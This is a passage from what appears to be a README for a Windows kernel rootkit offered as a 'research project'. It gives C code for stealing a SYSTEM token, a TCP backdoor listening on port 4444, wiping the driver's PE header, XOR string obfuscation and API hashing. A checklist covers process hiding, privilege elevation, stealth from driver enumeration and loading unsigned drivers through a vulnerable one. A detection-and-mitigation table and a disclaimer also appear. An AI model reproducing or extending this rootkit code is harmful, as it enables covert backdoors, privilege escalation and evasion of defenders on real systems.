ULONG64* slot = rk_token_slot(current);

// 4. Read current value, preserve EX_FAST_REF low 3 bits (refcount)
ULONG64 cur = *slot;
ULONG64 nval = ((ULONG64)new_tok) | (cur & 0x7ULL);

// 5. Atomic swap
InterlockedExchange64((volatile LONG64*)slot, (LONG64)nval);

// 6. Dereference old token (our reference)
PsDereferencePrimaryToken(old_tok);
```

### WSK Socket Listener

```c
// Initialize WSK
WskRegister(&g_wsk_client, &g_wsk_reg);
WskCaptureProviderNPI(&g_wsk_reg, WSK_INFINITE_WAIT, &g_wsk_provider);

// Create listen socket
WskSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, WSK_FLAG_LISTEN_SOCKET, ...);
WskBind(listen_sock, 0.0.0.0:4444, ...);
WskListen(listen_sock, ...);

// Accept loop (1-second timeout for unload checking)
for (;;) {
    if (KeReadStateEvent(&g_unload_event)) break;

    WskAccept(listen_sock, 0, NULL, ..., irp);
    // Wait with 1-second timeout
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10 * 1000 * 1000;  // 1 second
    wait_op(&g_accept_op, &timeout);

    if (client) {
        handle_client(client);
        WskCloseSocket(client, NULL);
    }
}
```

### PE Header Wipe (Optional)

```c
// 1. Allocate MDL for driver's header page
PMDL mdl = IoAllocateMdl(g_driver_base, 0x1000, FALSE, FALSE, NULL);

// 2. Probe and lock pages (read-only)
MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);

// 3. Map with write access
PVOID mapped = MmMapLockedPagesSpecifyCache(
    mdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);

// 4. Wipe entire page
RtlSecureZeroMemory(mapped, 0x1000);

// 5. Leave fake DOS header (e_magic = 0)
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapped;
dos->e_magic = 0x0000;

// 6. Cleanup
MmUnmapLockedPages(mapped, mdl);
MmUnlockPages(mdl);
IoFreeMdl(mdl);
```

### XOR String Obfuscation

```c
// Before (source):
XORSTR("Hello World")

// After (processed by xorstr.py):
RK_XORSTR_ENC("\x1F\x32\x2B\x2B\x2F\x1A\x72\x31\x26\x2B\x2F", 11)

// At runtime (in unprocessed source, degrades to plain string):
#define XORSTR(s) ((const char*)(s))

// In processed source:
#define XORSTR(s) rk_xorstr_decrypt_literal(s)

// Decryption function:
BOOLEAN rk_xor_decrypt(const UCHAR* enc, SIZE_T enc_len, UCHAR* out, SIZE_T out_cap) {
    for (SIZE_T i = 0; i < enc_len; i++) {
        out[i] = (UCHAR)(enc[i] ^ (UCHAR)XOR_KEY);
    }
    out[enc_len] = 0;
    return TRUE;
}
```

### API Hashing (FNV-1a)

```c
// FNV-1a 64-bit hash function
static __forceinline ULONG64 rk_fnv1a(const char* s) {
    ULONG64 h = 0xCBF29CE484222325ULL;  // FNV offset basis
    while (*s) {
        char c = *s++;
        if (c >= 'A' && c <= 'Z') c += 0x20;  // to lowercase
        h ^= (UCHAR)c;
        h *= 0x100000001B3ULL;  // FNV prime
    }
    return h;
}

// Usage: Resolve ntoskrnl export by hash
PVOID rk_resolve_nt(ULONG64 hash) {
    // Walk PsLoadedModuleList to find ntoskrnl.exe base
    // Parse PE export directory
    // Match FNV-1a hash of each exported name
    // Return function address
}
```

---

## 🛡️ Detection & Mitigation

### Detection Vectors

| Technique | Detects | Bypass Difficulty |
|-----------|---------|-------------------|
| **Kernel Callback (PsSetCreateProcessNotifyRoutine)** | Process creation, including hidden | Hard (kernel) |
| **ETW-TI (Event Tracing for Windows - Threat Intelligence)** | Image loads, thread creation, DNS, etc. | Very Hard |
| **Kernel Memory Scanning** | PE headers, pool tags (`Kdmp`), modified `ActiveProcessLinks` | Medium-Hard |
| **DKOM Detection** | Cross-view diff (EPROCESS list vs. `PsActiveProcessHead` walk) | Medium |
| **Module List Integrity** | `PsLoadedModuleList` vs. `EnumDeviceDrivers` mismatch | Medium |
| **DriverSection Check** | `DRIVER_OBJECT->DriverSection == NULL` | Easy |
| **Network Monitoring** | Suspicious outbound/inbound on port 4444 | Easy |
| **Registry Monitoring** | Service key creation (`HKLM\System\CurrentControlSet\Services\KdmpRt`) | Easy |
| **Pool Tag Scanning** | NonPagedPoolNx allocations with 'Kdmp' tag | Easy |
| **MDL Scanning** | Suspicious MDL usage for page remapping | Medium |

### Mitigations for Defenders

1. **Enable HVCI / VBS** — Prevents unsigned kernel drivers from loading
2. **Deploy Kernel EDR** — Callbacks + memory scanning detect DKOM/unlinked modules
3. **Monitor `PsLoadedModuleList`** — Periodic integrity checks from kernel sensor
4. **Block Unsigned Drivers** — `DSE` (Driver Signature Enforcement) + test signing audit
5. **Network Segmentation** — Block unauthorized inbound/outbound on non-standard ports
6. **Audit Service Installation** — Alert on new kernel service creation
7. **Monitor Pool Tags** — Scan for suspicious 'Kdmp' allocations
8. **ETW Integration** — Monitor ETW-TI events for kernel-mode activity

---

## 🧪 Testing Checklist

- [ ] Driver loads/unloads cleanly (`sc start` / `sc stop`)
- [ ] `controller.exe ping` returns `pong`
- [ ] `controller.exe ps` lists processes (verify hidden process excluded)
- [ ] `controller.exe hide <pid>` removes process from Task Manager
- [ ] `controller.exe unhide <pid>` restores visibility
- [ ] `controller.exe elevate 4` grants SYSTEM token (verify with `whoami`)
- [ ] `controller.exe exec C:\Windows\System32\cmd.exe` launches new process
- [ ] `controller.exe unload` cleans up service key
- [ ] TCP backdoor accepts connections on port 4444
- [ ] Framed commands work over TCP (ping, exec, ps, read, write, kill, hide, elevate, unload)
- [ ] Driver unload via TCP `CMD_UNLOAD` cleans up service key
- [ ] Stealth: `EnumDeviceDrivers` / `SystemModuleInformation` don't show driver
- [ ] PE header wipe (if enabled) defeats memory scanner signatures
- [ ] Hidden process is invisible to Process Explorer / Task Manager
- [ ] Unhidden process is visible again in Process Explorer / Task Manager
- [ ] Token theft elevates to SYSTEM (test with PID 4)
- [ ] File read/write works with kernel privileges
- [ ] Process kill terminates target process
- [ ] BYOVD loader successfully loads unsigned driver (if vulnerable driver available)

---

## 📚 References

- **DKOM**: "Rootkits: Subverting the Windows Kernel" (Blunden, 2009)
- **WSK**: Microsoft Docs — "Winsock Kernel (WSK) Reference"
- **Token Theft**: "Windows Internals, Part 1" (Russinovich, Solomon, Ionescu)
- **Module Unlinking**: "FU Rootkit" (fuzen_op), "TDL4" techniques
- **PE Header Wiping**: "Memory Forensics" (Ligh, Case, Levy, Walters)
- **BYOVD**: "Bring Your Own Vulnerable Driver" — Various security research papers
- **EPROCESS**: ReactOS source code, Windows Internals documentation

---

## 📄 License

This project is released under the **MIT License** — see [LICENSE](LICENSE) for details.

> **Note**: The MIT license permits reuse, but the **disclaimer above** still applies. Do not use this code for malicious purposes.

---

## 🤝 Contributing

This is a research project — PRs for bug fixes, documentation, or detection signatures are welcome. Feature requests for offensive capabilities will be declined.

---

**Built for learning. Deploy responsibly.**
